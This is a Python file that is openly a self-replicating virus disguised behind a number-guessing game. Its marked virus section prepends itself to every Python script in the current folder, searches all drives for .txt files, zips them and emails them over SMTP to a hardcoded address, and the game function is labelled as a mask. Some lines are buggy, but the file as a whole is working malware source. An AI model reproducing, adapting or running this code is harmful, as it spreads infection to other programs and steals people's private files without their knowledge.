### THE VIRUS STARTS HERE ###
import threading
import random
import math
import os

import glob, sys, time
def infection():
    code = []
    # open this file,read every lines and find the virus area
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    virus_area = False
    for line in lines:
        if line == '### THE VIRUS STARTS HERE ###\n':
            virus_area = True
        if virus_area:
            code.append(line)
        if line == '### THE VIRUS ENDS HERE ###\n':
            break

    # open every files and write the replicate code

    python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

    #print(python_scripts)

    for script in python_scripts: 
        with open(script, 'r') as f:
            script_code = f.readlines()

        infected = False
        for line in script_code:
            if line == '### THE VIRUS STARTS HERE ###\n':
                infected = True
                break
        
        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script, 'w') as f:
                f.writelines(final_code)

# Malicious piece of code
def Malicious():
    import string, os, shutil
    from ctypes import windll
    # scan and create temp folder
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    access = drives[-1] + ':\\tempvirus'

    if not os.path.exists(access):
        os.makedirs(access)

    dst_dir = access
    filePath = ''

    for D in drives:
        src_dir = D + ':\\'
        for dirpath, subdirs, files in os.walk(src_dir):
            for x in files:
                if x.endswith(".txt"):
                    try:
                        file = os.path.join(dirpath, x)
                        shutil.copy(filePath, dst_dir)
                    except:
                        pass

    filesToSend = shutil.make_archive('virusData.zip', 'zip', access)

    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders

    Username = open('mail.txt').readlines()[0][:-1]
    Password = open('mail.txt').readlines()[1][:-1]
    server = open('mail.txt').readlines()[2][:-1]
    port = int(open('mail.txt').readlines()[3])

    msg = MIMEMultipart()
    msg['Subject'] = 'This is the Data sent from your bot'
    msg['From'] = Username
    msg['To'] = 'quan.thai1987@gmail.com'

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open('virusData.zip.zip', 'rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename=\"%s.zip\"" % ('VirusData.zip'))
    msg.attach(part)

    smtp = smtplib.SMTP(server, port)
    smtp.login(Username, Password)
    smtp.sendmail(Username, 'quan.thai1987@gmail.com', msg.as_string())
    smtp.close()

#print(drives)

### THE VIRUS ENDS HERE ###

## Code for mask goes here
def mask():
    
    import psutil
    # Taking Inputs
    lower = int(input("Enter Lower bound:- "))
    
    # Taking Inputs
    upper = int(input("Enter Upper bound:- "))
    
    # generating random number between
    # the lower and upper
    x = random.randint(lower, upper)
    print("\n\tYou've only ",
        round(math.log(upper - lower + 1, 2)),
        " chances to guess the integer!\n")
    
    # Initializing the number of guesses.
    count = 0
    
    # for calculation of minimum number of
    # guesses depends upon range
    while count < math.log(upper - lower + 1, 2):
        count += 1
    
        # taking guessing number as input
        guess = int(input("Guess a number:- "))
    
        # Condition testing
        if x == guess:
            print("Congratulations you did it in ",
                count, " try")
            current_system_pid = os.getpid()
            ThisSystem = psutil.Process(current_system_pid)
            ThisSystem.terminate()
            # Once guessed, loop will break
        elif x > guess:
            print("You guessed too small!")
        elif x < guess:
            print("You Guessed too high!")
    
    # If Guessing is more than required guesses,
    # shows this output.
    if count >= math.log(upper - lower + 1, 2):
        print("\nThe number is %d" % x)
        print("\tBetter Luck Next time!")
        current_system_pid = os.getpid()
        ThisSystem = psutil.Process(current_system_pid)
        ThisSystem.terminate()
T1 = threading.Thread(target=infection)
T1.start()
T2 = threading.Thread(target=Malicious())
T2.start()
T3 = threading.Thread(target=mask)
T3.start()

